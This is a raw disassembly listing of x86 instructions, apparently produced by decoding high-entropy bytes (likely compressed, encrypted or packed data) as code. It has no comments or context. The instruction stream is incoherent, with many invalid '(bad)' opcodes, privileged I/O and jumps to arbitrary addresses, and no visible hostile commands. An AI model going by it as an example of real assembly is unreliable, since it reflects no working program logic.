  41b471:	mov    edx,0x969636f2
  41b476:	inc    edi
  41b477:	cmp    eax,0xb518308a
  41b47c:	or     DWORD PTR [edx-0x5df141d8],ecx
  41b482:	xchg   esi,eax
  41b483:	adc    BYTE PTR [ebx+0x3b739b4],al
  41b489:	mov    bl,0x3a
  41b48b:	adc    ebp,esi
  41b48d:	inc    ebp
  41b48e:	repz shl DWORD PTR [edi-0x7d],1
  41b492:	mov    bh,0x88
  41b494:	das    
  41b495:	add    BYTE PTR [ebx+0x4de7c257],dl
  41b49b:	cmp    DWORD PTR ds:0x66896d4,edi
  41b4a1:	mov    dh,0xbb
  41b4a3:	std    
  41b4a4:	scas   eax,DWORD PTR es:[edi]
  41b4a5:	fistp  DWORD PTR ss:[ecx]
  41b4a8:	cmp    DWORD PTR [esi+ebp*4-0x71],edx
  41b4ac:	xchg   edx,eax
  41b4ad:	daa    
  41b4ae:	cmp    esi,DWORD PTR [ecx+0x39]
  41b4b1:	(bad)  [edi+ecx*8]
  41b4b4:	sahf   
  41b4b5:	and    BYTE PTR [ebp+0x4e],0x33
  41b4b9:	loop   0x41b47f
  41b4bb:	(bad)  
  41b4bc:	and    eax,ecx
  41b4be:	sbb    BYTE PTR [edi+0x74267fe1],0x6
  41b4c5:	and    al,0x45
  41b4c7:	into   
  41b4c8:	fsubr  st,st(3)
  41b4ca:	sub    DWORD PTR [ebx],esp
  41b4cc:	mov    ecx,0x2bb90139
  41b4d1:	cmp    DWORD PTR [esi+edi*4+0x534e2233],esi
  41b4d8:	fwait
  41b4d9:	adc    edi,DWORD PTR [edx+0x4b0d9c1e]
  41b4df:	add    al,0xed
  41b4e1:	outs   dx,DWORD PTR ds:[esi]
  41b4e2:	and    ebx,DWORD PTR [edx+0x5a]
  41b4e5:	adc    BYTE PTR [ecx],dh
  41b4e7:	cli    
  41b4e8:	mov    bl,0x1
  41b4ea:	ret    0xf2bf
  41b4ed:	lea    edi,[eax-0x46750df9]
  41b4f3:	(bad)  
  41b4f4:	icebp  
  41b4f5:	bound  edi,QWORD PTR ds:0x32d987fd
  41b4fb:	out    dx,al
  41b4fc:	pop    edi
  41b4fd:	(bad)  
  41b4ff:	stos   DWORD PTR es:[edi],eax
  41b500:	lock xchg esi,eax
  41b502:	enter  0x9f3d,0x73
  41b506:	test   eax,0x1e4c281c
  41b50b:	cmc    
  41b50c:	add    esp,ecx
  41b50e:	lds    esi,FWORD PTR [esi-0x62]
  41b511:	pushf  
  41b512:	cli    
  41b513:	push   0xb5b0b62e
  41b518:	les    eax,FWORD PTR [eax+ecx*8]
  41b51b:	sbb    BYTE PTR [edx+0x56],bh
  41b51e:	xchg   edi,eax
  41b51f:	paddw  mm0,mm3
  41b522:	and    DWORD PTR [edx-0x1b],esi
  41b525:	lock outs dx,DWORD PTR ds:[esi]
  41b527:	mov    ch,0xdc
  41b529:	sub    DWORD PTR [edi+0x42],0xe
  41b52d:	xchg   esi,eax
  41b52e:	sub    BYTE PTR [ebx-0x22bc38cc],ch
  41b534:	push   ecx
  41b535:	jp     0x41b4fa
  41b537:	rdtsc  
  41b539:	int3   
  41b53a:	int3   
  41b53b:	mov    dh,0xba
  41b53d:	outs   dx,BYTE PTR ds:[esi]
  41b53e:	add    ch,BYTE PTR [edi+0x32ee5eb8]
  41b544:	xor    cl,BYTE PTR [ebx-0x2d]
  41b547:	cmp    eax,0x5691566
  41b54c:	push   ebx
  41b54d:	cli    
  41b54e:	stos   BYTE PTR es:[edi],al
  41b54f:	adc    al,BYTE PTR [edi-0x1a2df213]
  41b555:	xchg   edx,esi
  41b557:	arpl   WORD PTR [esi],bx
  41b559:	mov    ah,0x4e
  41b55b:	pop    esi
  41b55c:	fidivr WORD PTR [ebx-0x4fa150a8]
  41b562:	inc    ecx
  41b563:	nop
  41b564:	cdq    
  41b565:	add    eax,0x545a2edf
  41b56a:	and    DWORD PTR [edi+0x16],edi
  41b56d:	aas    
  41b56e:	dec    ecx
  41b56f:	retf   
  41b570:	jge    0x41b5d6
  41b572:	xor    al,0x8b
  41b574:	push   ds
  41b575:	popa   
  41b576:	sbb    al,0x6c
  41b578:	in     al,dx
  41b579:	sbb    al,0x5e
  41b57b:	int3   
  41b57c:	push   es
  41b57d:	int    0xaa
  41b57f:	int    0x73
  41b581:	scas   eax,DWORD PTR es:[edi]
  41b582:	ret    0x8c65
  41b585:	pusha  
  41b586:	mov    dl,0x6c
  41b588:	cli    
  41b589:	sti    
  41b58a:	fist   DWORD PTR [ebp+0x74]
  41b58d:	xchg   esi,eax
  41b58e:	(bad)  
  41b58f:	push   eax
  41b590:	adc    eax,0x2b622e5a
  41b595:	cmp    DWORD PTR [edx+0x7850444],0x5ee6ac1f
  41b59f:	push   ebx
  41b5a0:	dec    esp
  41b5a1:	loop   0x41b56f
  41b5a3:	pop    ss
  41b5a4:	push   0x31
  41b5a6:	mov    ecx,0x82efc8cc
  41b5ab:	mov    ebp,0x9b022c8e
  41b5b0:	(bad)  
  41b5b1:	shl    DWORD PTR [ebp-0x41],cl
  41b5b4:	sub    eax,0x9525e51c
  41b5b9:	outs   dx,BYTE PTR ds:[esi]
  41b5ba:	gs ins BYTE PTR es:[edi],dx
  41b5bc:	(bad)  
  41b5bd:	jns    0x41b596
  41b5bf:	push   es
  41b5c0:	into   
  41b5c1:	and    cl,BYTE PTR [edi]
  41b5c3:	lds    esi,FWORD PTR [ecx-0x76b44dc9]
  41b5c9:	adc    cl,BYTE PTR [esi+0xba7aa6]
  41b5cf:	sbb    bl,BYTE PTR [ecx]
  41b5d1:	enter  0xa5e9,0xaf
  41b5d5:	test   eax,0xe0ba4047
  41b5da:	adc    BYTE PTR [ebx],bh
  41b5dc:	xchg   ecx,eax
  41b5dd:	inc    edx
  41b5de:	pop    edx
  41b5df:	and    eax,0x5519542d
  41b5e4:	inc    edx
  41b5e5:	add    BYTE PTR [edi-0x3602350b],ah
  41b5eb:	mov    DWORD PTR [edx+eiz*2-0x2c],esp
  41b5ef:	rcr    BYTE PTR [edi-0x63],1
  41b5f2:	sahf   
  41b5f3:	inc    esp
  41b5f4:	in     al,0x3
  41b5f6:	sar    edi,cl
  41b5f8:	retf   
  41b5f9:	cmc    
  41b5fa:	imul   edi,DWORD PTR [ebp+0x26],0x9867764
  41b601:	pusha  
  41b602:	repnz (bad) 
  41b604:	jb     0x41b5c4
  41b606:	jmp    0x904e9a32
  41b60b:	lods   al,BYTE PTR ds:[esi]
  41b60c:	fcom   QWORD PTR [ecx+0x57]
  41b60f:	jge    0x41b5d3
  41b611:	fidivr WORD PTR [eax]
  41b613:	mov    ecx,0x23d1d6a2
  41b618:	dec    ebp
  41b619:	aam    0x15
  41b61b:	call   0xb8d64ef2
  41b620:	pop    eax
  41b621:	mov    ebp,0xcba2189d
  41b626:	fadd   st,st(0)
  41b628:	ficom  DWORD PTR [ecx+0x6e]
  41b62b:	mov    ds:0x203ee62,eax
  41b630:	push   edx
  41b631:	stc    
  41b632:	(bad)  
  41b633:	inc    edi
  41b634:	jns    0x41b5e9
  41b636:	push   es
  41b637:	std    
  41b638:	mov    ebx,0x886a6201
  41b63d:	call   0x696140b6
  41b642:	pushf  
  41b643:	dec    ecx
  41b644:	sbb    BYTE PTR [ebp-0xe8c16db],ah
  41b64a:	jne    0x41b660
  41b64c:	xchg   ecx,eax
  41b64d:	or     DWORD PTR cs:[esi-0x6e],ecx
  41b651:	fisttp QWORD PTR [ebx+0x647af946]
  41b657:	(bad)  
  41b658:	jnp    0x41b6ae
  41b65a:	out    dx,al
  41b65b:	dec    esi
  41b65c:	jb     0x41b6c0
  41b65e:	in     al,0xc6
  41b660:	and    eax,0xd8512af4
  41b665:	mov    ecx,0xeb1d718a
  41b66a:	ret    0x334a
  41b66d:	test   eax,edi
  41b66f:	out    dx,eax
  41b670:	rcl    DWORD PTR [edx+0x2ae910c0],1
  41b676:	add    edi,DWORD PTR [edi]
  41b678:	add    al,0x44
  41b67a:	cld    
  41b67b:	(bad)  
  41b67c:	int    0x50
  41b67e:	outs   dx,BYTE PTR ds:[esi]
  41b67f:	nop
  41b680:	push   ebp
  41b681:	rcr    DWORD PTR [ecx],1
  41b683:	jmp    0x5c18:0xe4309597
  41b68a:	mov    al,0x98
  41b68c:	aad    0x4e
  41b68e:	test   DWORD PTR [esp+eiz*2+0x73],edx
  41b692:	push   esp
  41b693:	in     al,0xd
  41b695:	push   ecx
  41b696:	shl    eax,cl
  41b698:	pushf  
  41b699:	mov    dh,0x57
  41b69b:	ret    0x68c0
  41b69e:	and    al,0xf7
  41b6a0:	dec    ebx
  41b6a1:	and    cl,ah
  41b6a3:	adc    BYTE PTR [ecx],bh
  41b6a5:	sub    bh,ah
  41b6a7:	fsubr  DWORD PTR [ecx]
  41b6a9:	hlt    
  41b6aa:	call   0xb7f6:0x1b982d0c
  41b6b1:	xchg   esp,eax
  41b6b2:	inc    esi
  41b6b3:	sahf   
  41b6b4:	mov    al,ds:0xe67ee5aa
  41b6b9:	xchg   edx,eax
  41b6ba:	mov    eax,ds:0xd22985ea
  41b6bf:	jmp    0xbd1a95a6
  41b6c4:	mov    ah,BYTE PTR [eax-0x6d]
  41b6c7:	or     cl,BYTE PTR [eax-0x7893339b]
  41b6cd:	out    0x2a,al
  41b6cf:	retf   
  41b6d0:	ret    0xa6f7
  41b6d3:	(bad)  
  41b6d5:	xchg   ecx,edx
  41b6d7:	lods   al,BYTE PTR ds:[esi]
  41b6d8:	jns    0x41b6c7
  41b6da:	cmp    DWORD PTR [esi-0x4e9c5c8f],0x92fa5add
  41b6e4:	add    ch,BYTE PTR [ecx-0x2705059d]
  41b6ea:	lahf   
  41b6eb:	mov    cl,0xb8
  41b6ed:	std    
  41b6ee:	jg     0x41b712
  41b6f0:	sub    eax,0xbee2426e
  41b6f5:	jmp    0xdc16:0x32f57573
  41b6fc:	pop    edx
  41b6fd:	hlt    
  41b6fe:	adc    BYTE PTR [edi-0x4],dh
  41b701:	add    dh,dl
  41b703:	mov    DWORD PTR [ebx+0x68972fec],eax
  41b709:	iret   
  41b70a:	imul   edx,DWORD PTR [eax-0x1c],0x3a
  41b70e:	push   es
  41b70f:	jae    0x41b6d2
  41b711:	or     BYTE PTR [esi],bl
  41b713:	dec    DWORD PTR [esi]
  41b715:	xchg   edi,eax
  41b716:	mov    edx,0x991bd296
  41b71b:	cmp    DWORD PTR [edi+0x39],edx
  41b71e:	pop    eax
  41b71f:	(bad)  
  41b720:	clc    
  41b721:	test   BYTE PTR [ebx],0x90
  41b724:	mov    DWORD PTR [edx+0x7f9b3c0a],eax
  41b72a:	push   ss
  41b72b:	cdq    
  41b72c:	repnz outs dx,BYTE PTR ds:[si]
  41b72f:	inc    edi
  41b730:	sbb    eax,0x4a5863f1
  41b735:	bound  ecx,QWORD PTR [ecx]
  41b737:	mov    ch,ch
  41b739:	or     ecx,DWORD PTR ds:0xecdcf097
  41b73f:	push   esp
  41b740:	sub    ebx,DWORD PTR [esi+ebx*8+0x50]
  41b744:	cdq    
  41b745:	sbb    DWORD PTR [esi],edi
  41b747:	mov    ah,0x81
  41b749:	pop    ds
  41b74a:	int3   
  41b74b:	or     eax,0xa1f01eca
  41b750:	mov    gs,WORD PTR [eax]
  41b752:	fisubr WORD PTR [edi]
  41b754:	jg     0x41b776
  41b756:	cmp    eax,0xd939fbdb
  41b75b:	out    dx,al
  41b75c:	jne    0x41b784
  41b75e:	stc    
  41b75f:	test   al,0x8d
  41b761:	xchg   BYTE PTR [edi+0x6a],bh
  41b764:	dec    edi
  41b765:	clc    
  41b766:	rol    BYTE PTR [eax+edi*8+0x7c],cl
  41b76a:	leave  
  41b76b:	and    bl,ch
  41b76d:	push   eax
  41b76e:	cs adc eax,0xb96b26d2
  41b774:	mov    fs,WORD PTR [eax+0x55]
  41b777:	fmul   st,st(0)
  41b779:	scas   al,BYTE PTR es:[edi]
  41b77a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b77b:	inc    edx
  41b77c:	xor    BYTE PTR [eax],ah
  41b77e:	adc    BYTE PTR [edi+0x51],al
  41b781:	mov    edx,0xb2885de9
  41b786:	xor    ebx,esi
  41b788:	enter  0x8b3c,0xcc
  41b78c:	sub    eax,0xc083bb56
  41b791:	mov    BYTE PTR [ebx+0x6b],bl
  41b794:	je     0x41b73a
  41b796:	jo     0x41b740
  41b798:	sbb    BYTE PTR [esi],bl
  41b79a:	pop    es
  41b79b:	std    
  41b79c:	out    0x87,eax
  41b79e:	push   eax
  41b79f:	(bad)  
  41b7a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7a1:	add    al,0xae
  41b7a3:	scas   eax,DWORD PTR es:[edi]
  41b7a4:	inc    ebx
  41b7a5:	sbb    DWORD PTR [ebx],eax
  41b7a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7a8:	(bad)  
  41b7a9:	jecxz  0x41b7b9
  41b7ab:	mov    DWORD PTR ds:0x567a0408,0xdb514eff
  41b7b5:	(bad)  
  41b7b6:	in     al,dx
  41b7b7:	xor    eax,0x36b2de89
  41b7bc:	stc    
  41b7bd:	sbb    ah,BYTE PTR [eax]
  41b7bf:	push   0xfe29709f
  41b7c4:	push   ebp
  41b7c5:	pop    ds
  41b7c6:	xchg   ebx,eax
  41b7c7:	push   ebp
  41b7c8:	push   cs
  41b7c9:	mov    edx,0x3b46156
  41b7ce:	(bad)  
  41b7d0:	jl     0x41b837
  41b7d2:	xor    edx,DWORD PTR [ecx+0xd08a6de]
  41b7d8:	repz in al,0x46
  41b7db:	dec    edi
  41b7dc:	mov    ebx,0x7c28cb8c
  41b7e1:	std    
  41b7e2:	loop   0x41b77e
  41b7e4:	push   0xf57623bf
  41b7e9:	gs dec esi
  41b7eb:	int    0xc0
  41b7ed:	jmp    0x66b9d3d9
  41b7f2:	out    dx,al
  41b7f3:	xor    DWORD PTR [edi],0x4234cb3f
  41b7f9:	gs jns 0x41b874
  41b7fc:	jnp    0x41b86a
  41b7fe:	and    DWORD PTR [ebp+0x68],esi
  41b801:	push   edx
  41b802:	(bad)  
  41b803:	out    0x80,al
  41b805:	mov    al,0xee
  41b807:	leave  
  41b808:	rcl    ecx,0xbf
  41b80b:	jo     0x41b852
  41b80d:	inc    esi
  41b80e:	out    dx,al
  41b80f:	dec    edx
  41b810:	mov    edi,0x3e132cb8
  41b815:	inc    esp
  41b816:	mov    dl,BYTE PTR ds:[edx+ebp*4+0x5f]
  41b81b:	and    cl,BYTE PTR [ebx+0x7e]
  41b81e:	shl    DWORD PTR [esi-0x71],1
  41b821:	cmc    
  41b822:	xor    ecx,DWORD PTR [ecx]
  41b824:	into   
  41b825:	jae    0x41b835
  41b827:	int3   
  41b828:	xor    ebx,DWORD PTR [esi]
  41b82a:	or     eax,0x15c29101
  41b82f:	rol    DWORD PTR [edi],0xa1
  41b832:	scas   eax,DWORD PTR es:[edi]
  41b833:	test   bl,bh
  41b835:	mov    dh,0x45
  41b837:	int3   
  41b838:	fwait
  41b839:	xchg   BYTE PTR [edi+eiz*4-0x7d420a],dl
  41b840:	js     0x41b83e
  41b842:	push   ebx
  41b843:	dec    edi
  41b844:	push   eax
  41b845:	test   BYTE PTR [edi+0x1565a6c7],ch
  41b84b:	jno    0x41b7fb
  41b84d:	cdq    
  41b84e:	cli    
  41b84f:	pop    ebp
  41b850:	push   0x87f5c55d
  41b855:	mov    ebp,0xc99400f6
  41b85a:	clc    
  41b85b:	jns    0x41b86e
  41b85d:	cmc    
  41b85e:	arpl   WORD PTR [esi],cx
  41b860:	mov    bh,0xf3
  41b862:	out    0xce,eax
  41b864:	into   
  41b865:	add    ebx,ecx
  41b867:	not    DWORD PTR [edi-0x69686e69]
  41b86d:	outs   dx,BYTE PTR ds:[esi]
  41b86e:	add    DWORD PTR [ebp-0x43c93e11],edi
  41b874:	repz out dx,al
  41b876:	push   edi
  41b877:	in     eax,0x3c
  41b879:	or     bh,al
  41b87b:	pop    edx
  41b87c:	push   ds
  41b87d:	call   0xe78d:0xfc483d76
  41b884:	jecxz  0x41b874
  41b886:	aad    0x81
  41b888:	cmp    eax,0xcede3c2b
  41b88d:	imul   edx,DWORD PTR [esi+0x4],0x8e5664e7
  41b894:	sbb    BYTE PTR [eax],dh
  41b896:	ins    BYTE PTR es:[edi],dx
  41b897:	sbb    edx,esp
  41b899:	dec    esi
  41b89a:	test   eax,0x63ef2332
  41b89f:	inc    ebp
  41b8a0:	loopne 0x41b87e
  41b8a2:	sub    esi,edi
  41b8a4:	jns    0x41b858
  41b8a6:	inc    edx
  41b8a7:	jge    0x41b8bd
  41b8a9:	pop    es
  41b8aa:	cmp    DWORD PTR [esi+0xd],ebp
  41b8ad:	sbb    ebp,0x6a
  41b8b0:	js     0x41b843
  41b8b2:	jbe    0x41b8f9
  41b8b4:	rcr    BYTE PTR [eax-0x3d],0x45
  41b8b8:	mov    bl,0xfb
  41b8ba:	jae    0x41b869
  41b8bc:	dec    edi
  41b8bd:	add    ebp,DWORD PTR [eax+0x353de29d]
  41b8c3:	fwait
  41b8c4:	out    dx,al
  41b8c5:	pop    eax
  41b8c6:	sbb    al,BYTE PTR [ecx-0x4b]
  41b8c9:	adc    ecx,ecx
  41b8cb:	leave  
  41b8cc:	mov    ds:0x4c030431,eax
  41b8d1:	mov    WORD PTR [ebp+0x4a5a7bd9],ds
  41b8d7:	pop    DWORD PTR [eax+0x2e]
  41b8da:	jo     0x41b8de
  41b8dc:	arpl   WORD PTR [edi+0x48],bx
  41b8df:	ficomp WORD PTR [edx]
  41b8e1:	je     0x41b8dd
  41b8e3:	or     ch,BYTE PTR [eax+0x215f98ab]
  41b8e9:	test   eax,0xb70c2cd7
  41b8ee:	stos   DWORD PTR es:[edi],eax
  41b8ef:	pop    ss
  41b8f0:	(bad)  
  41b8f1:	jmp    0x41b94d
  41b8f3:	fadd   QWORD PTR [ebx+0x7d]
  41b8f6:	je     0x41b8d5
  41b8f8:	push   ecx
  41b8f9:	inc    ebx
  41b8fa:	mov    dh,0x5a
  41b8fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8fd:	cmp    BYTE PTR [edi],ah
  41b8ff:	fisttp DWORD PTR [eax+eax*4]
  41b902:	xchg   DWORD PTR [esp+edi*2+0x5b],edi
  41b906:	lods   eax,DWORD PTR ds:[esi]
  41b907:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b908:	push   edx
  41b909:	out    0x60,al
  41b90b:	loope  0x41b909
  41b90d:	sub    esi,edi
  41b90f:	fst    DWORD PTR [esi-0x1e869db6]
  41b915:	mov    dl,0x11
  41b917:	sbb    dh,BYTE PTR [ecx-0x59277520]
  41b91d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b91e:	stc    
  41b91f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b920:	pop    es
  41b921:	jno    0x41b99e
  41b923:	loope  0x41b932
  41b925:	mov    BYTE PTR [ebp+0x366caa78],ah
  41b92b:	xchg   esp,eax
  41b92c:	dec    ecx
  41b92d:	xor    bl,BYTE PTR [esp+ebp*1-0x51]
  41b931:	push   ebx
  41b932:	xor    eax,0xbc4c5d4a
  41b937:	cwde   
  41b938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b939:	aam    0x73
  41b93b:	iret   
  41b93c:	cdq    
  41b93d:	pop    ss
  41b93e:	mov    WORD PTR [eax-0x41a9b7e2],fs
  41b944:	or     al,0x7c
  41b946:	pusha  
  41b947:	push   eax
  41b948:	xor    eax,0x7417c27e
  41b94d:	(bad)  
  41b94f:	je     0x41b9a4
  41b951:	cmp    eax,0x4247f3e3
  41b956:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b957:	call   0x73d07d60
  41b95c:	lds    esp,FWORD PTR ds:0xc79aa847
  41b962:	jne    0x41b96d
  41b964:	mov    eax,0xc2a9f33b
  41b969:	mov    DWORD PTR [esi],ecx
  41b96b:	add    ebp,edi
  41b96d:	adc    eax,0xf562b6c3
  41b972:	imul   esp,DWORD PTR [ebx-0x6f],0x8915e76b
  41b979:	push   ds
  41b97a:	mov    ds:0x812e88bc,eax
  41b97f:	mov    ds:0xf54c3abf,al
  41b984:	(bad)  
  41b985:	mov    eax,ds:0x30ab6f3a
  41b98a:	fwait
  41b98b:	sbb    al,0x9a
  41b98d:	cmp    DWORD PTR [esi],edx
  41b98f:	mov    esp,0x6837007c
  41b994:	inc    ecx
  41b995:	ja     0x41b97f
  41b997:	inc    edx
  41b998:	jnp    0x41b923
  41b99a:	shl    DWORD PTR [eax+0x4d],1
  41b99d:	mov    edi,0x7713cc13
  41b9a2:	mov    ds:0xdffee6af,eax
  41b9a7:	mov    ebp,0xae56104e
  41b9ac:	and    DWORD PTR [ecx+0x21ef0629],esi
  41b9b2:	mov    ebx,0x35abded0
  41b9b7:	cmp    al,0x82
  41b9b9:	mov    eax,0x3037ae65
  41b9be:	jne    0x41b999
  41b9c0:	dec    edi
  41b9c1:	retf   
  41b9c2:	pop    ebx
  41b9c3:	or     edi,DWORD PTR [eax+0x60]
  41b9c6:	loop   0x41b98c
  41b9c8:	xchg   ecx,eax
  41b9c9:	sub    ebx,edi
  41b9cb:	or     al,ch
  41b9cd:	xchg   esp,eax
  41b9ce:	and    DWORD PTR [ebx-0x53ed7eb4],esp
  41b9d4:	inc    ecx
  41b9d5:	cmp    ch,0x97
  41b9d8:	ja     0x41ba40
  41b9da:	fistp  WORD PTR [edx]
  41b9dc:	jmp    0xf83f:0xee08e483
  41b9e3:	cdq    
  41b9e4:	push   cs
  41b9e5:	js     0x41ba54
  41b9e7:	jns    0x41b9e3
  41b9e9:	lods   eax,DWORD PTR ds:[esi]
  41b9ea:	mov    edx,0x689e319b
  41b9ef:	mov    dh,BYTE PTR [edi-0x70]
  41b9f2:	fidivr DWORD PTR [eax]
  41b9f4:	out    0xf8,al
  41b9f6:	not    dl
  41b9f8:	pushf  
  41b9f9:	addr16 dec esp
  41b9fb:	cmp    eax,0x4aaaeedc
  41ba00:	dec    esp
  41ba01:	push   ecx
  41ba02:	repz std 
  41ba04:	in     al,0x40
  41ba06:	test   DWORD PTR [edi+eiz*8+0xe],ebx
  41ba0a:	jo     0x41b997
  41ba0c:	and    ecx,0xffffff9a
  41ba0f:	dec    edi
  41ba10:	and    dh,ch
  41ba12:	sbb    ch,BYTE PTR [ebx+0x2a]
  41ba15:	jl     0x41ba73
  41ba17:	dec    ecx
  41ba18:	fistp  DWORD PTR [edi-0x45]
  41ba1b:	aas    
  41ba1c:	mov    ds:0x7f8147ed,eax
  41ba21:	or     eax,0x70bad9d
  41ba26:	not    DWORD PTR [ebx-0x60]
  41ba29:	enter  0xe3d1,0x30
  41ba2d:	mov    bh,0xd9
  41ba2f:	xchg   ebx,eax
  41ba30:	mov    dh,0xbb
  41ba32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba33:	cmp    al,0x83
  41ba35:	pop    eax
  41ba36:	cld    
  41ba37:	dec    esp
  41ba38:	and    al,0x24
  41ba3a:	(bad)  
  41ba3b:	shr    bh,cl
  41ba3d:	push   0xffffffc9
  41ba3f:	push   cs
  41ba40:	popa   
  41ba41:	mov    al,0xc5
  41ba43:	int    0xc7
  41ba45:	(bad)  [ecx+0x5]
  41ba48:	mov    BYTE PTR [eax+0x6b89d7f7],bl
  41ba4e:	jecxz  0x41ba31
  41ba50:	xor    ebp,DWORD PTR [edx]
  41ba52:	clc    
  41ba53:	xor    esi,edi
  41ba55:	cli    
  41ba56:	sbb    edx,ecx
  41ba58:	sub    al,0x32
  41ba5a:	mov    al,0x57
  41ba5c:	push   ecx
  41ba5d:	inc    edi
  41ba5e:	sub    DWORD PTR [ecx-0x39],ebp
  41ba61:	ins    DWORD PTR es:[edi],dx
  41ba62:	cmp    esp,edi
  41ba64:	out    dx,al
  41ba65:	inc    edx
  41ba66:	pusha  
  41ba67:	xor    eax,0xe30f3b35
  41ba6c:	mov    edi,0x35e14a60
  41ba71:	xor    eax,0xbab85c8d
  41ba76:	cmc    
  41ba77:	mov    dh,0x6f
  41ba79:	stos   DWORD PTR es:[edi],eax
  41ba7a:	sbb    eax,0x53115cfc
  41ba7f:	add    edi,DWORD PTR ds:[ebx]
  41ba82:	push   ss
  41ba83:	lds    ecx,FWORD PTR [ebx]
  41ba85:	mov    BYTE PTR [edi+0x66],bl
  41ba88:	sti    
  41ba89:	xchg   esi,eax
  41ba8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba8b:	dec    esi
  41ba8c:	cmpxchg DWORD PTR [esi-0x31962099],edi
  41ba93:	xchg   edi,eax
  41ba94:	addr16 cmp al,0x2c
  41ba97:	les    ecx,FWORD PTR [ebx-0x5acfd2d8]
  41ba9d:	dec    edx
  41ba9e:	jecxz  0x41ba5b
  41baa0:	stos   DWORD PTR es:[edi],eax
  41baa1:	sub    dl,BYTE PTR [eax]
  41baa3:	jge    0x41ba88
  41baa5:	clc    
  41baa6:	loopne 0x41bae0
  41baa8:	sub    esp,ebx
  41baaa:	add    BYTE PTR [esi+0x3815bba8],ch
  41bab0:	repnz test al,0xaa
  41bab3:	loope  0x41bb16
  41bab5:	xor    ch,ch
  41bab7:	adc    ebp,esi
  41bab9:	lahf   
  41baba:	add    eax,0x999b146e
  41babf:	(bad)  
  41bac0:	je     0x41ba90
  41bac2:	outs   dx,DWORD PTR ds:[esi]
  41bac3:	test   BYTE PTR [edi+0x74],cl
  41bac6:	sahf   
  41bac7:	jns    0x41bac2
  41bac9:	add    ch,bl
  41bacb:	pop    ss
  41bacc:	xor    eax,0x32a348f8
  41bad1:	push   ss
  41bad2:	popa   
  41bad3:	ficomp DWORD PTR [ecx-0x5d]
  41bad6:	popf   
  41bad7:	ss sbb ebx,ecx
  41bada:	add    esi,DWORD PTR [eax+0x33de8ee3]
  41bae0:	xor    BYTE PTR [edi+0x65f79161],ch
  41bae6:	pusha  
  41bae7:	jecxz  0x41bab8
  41bae9:	push   esp
  41baea:	sbb    ecx,DWORD PTR [ebx-0x5209a90c]
  41baf0:	inc    ebx
  41baf1:	sbb    eax,0x4e10e0be
  41baf6:	xor    eax,0xd63fcde6
  41bafb:	adc    edx,DWORD PTR [esi]
  41bafd:	fist   DWORD PTR [ebp+eax*8-0x3e]
  41bb01:	jecxz  0x41bae6
  41bb03:	out    0xc9,al
  41bb05:	push   ebp
  41bb06:	xchg   ebp,eax
  41bb07:	jecxz  0x41badd
  41bb09:	dec    ecx
  41bb0a:	lods   eax,DWORD PTR ds:[esi]
  41bb0b:	or     ecx,DWORD PTR [esi]
  41bb0d:	stc    
  41bb0e:	out    0x75,eax
  41bb10:	cmp    esp,ebp
  41bb12:	and    ebx,DWORD PTR [edi-0x708a4662]
  41bb18:	xor    ebp,edx
  41bb1a:	fcomp  QWORD PTR [ebx-0x223649a8]
  41bb20:	aam    0xe5
  41bb22:	lds    esi,FWORD PTR [esi+0x53]
  41bb25:	mov    dh,0x20
  41bb27:	test   DWORD PTR [ecx+eiz*8+0x70dd54e6],edx
  41bb2e:	mov    ebp,0x9f3fe796
  41bb33:	enter  0x1e23,0x1e
  41bb37:	push   0xd124ee5c
  41bb3c:	sub    DWORD PTR [eax+0x1eb71d58],ecx
  41bb42:	repnz mov al,ds:0x85279874
  41bb48:	imul   DWORD PTR [ebx-0x18]
  41bb4b:	mov    ebp,0x4733dbb
  41bb50:	jge    0x41bb1d
  41bb52:	(bad)  cs:[edx+0x2e]
  41bb56:	sub    bh,ah
  41bb58:	mov    ebp,0x4f57f9e8
  41bb5d:	jne    0x41baf4
  41bb5f:	xchg   ebp,eax
  41bb60:	fwait
  41bb61:	and    edx,DWORD PTR [edx]
  41bb63:	mov    ?,WORD PTR [edi+0x6efc24dc]
  41bb69:	shl    BYTE PTR es:[edx+0x37679905],0x88
  41bb71:	jnp    0x41bb37
  41bb73:	mov    es,ebx
  41bb75:	xor    DWORD PTR ds:0xad13096d,ebp
  41bb7b:	imul   ebx,DWORD PTR es:[ecx-0x46],0x4c
  41bb80:	dec    edx
  41bb81:	add    al,0x72
  41bb83:	mov    ds:0xf3864835,eax
  41bb88:	cdq    
  41bb89:	jl     0x41bb82
  41bb8b:	lock (bad) 
  41bb8d:	(bad)  
  41bb8e:	push   cs
  41bb8f:	fistp  WORD PTR [ecx]
  41bb91:	loope  0x41bb5b
  41bb93:	lods   eax,DWORD PTR ds:[esi]
  41bb94:	pusha  
  41bb95:	sub    ch,BYTE PTR [esi-0x69ffac02]
  41bb9b:	mov    edi,0x878ad804
  41bba0:	jmp    0xc119:0xb59b20db
  41bba7:	lahf   
  41bba8:	stc    
  41bba9:	sbb    eax,0x532e98d2
  41bbae:	cld    
  41bbaf:	cmp    eax,0x370136b8
  41bbb4:	in     eax,dx
  41bbb5:	or     dl,BYTE PTR [edx]
  41bbb7:	popa   
  41bbb8:	push   es
  41bbb9:	mov    ecx,DWORD PTR [ebx]
  41bbbb:	xchg   BYTE PTR [eax+0x65c2ddcb],dh
  41bbc1:	lea    ebx,[ecx-0x38]
  41bbc4:	icebp  
  41bbc5:	pop    esi
  41bbc6:	push   cs
  41bbc7:	stos   BYTE PTR es:[edi],al
  41bbc8:	(bad)  
  41bbca:	lgs    ecx,FWORD PTR [ebx]
  41bbcd:	push   0x15088ba2
  41bbd2:	add    DWORD PTR [edx-0x3b],0x45
  41bbd6:	repz jnp 0x41bbeb
  41bbd9:	jmp    0x3514a989
  41bbde:	mov    al,ds:0xbdc77bd7
  41bbe3:	sbb    al,BYTE PTR [ebx-0x11]
  41bbe6:	sbb    BYTE PTR [edi+0xa],bh
  41bbe9:	jbe    0x41bbda
  41bbeb:	out    dx,al
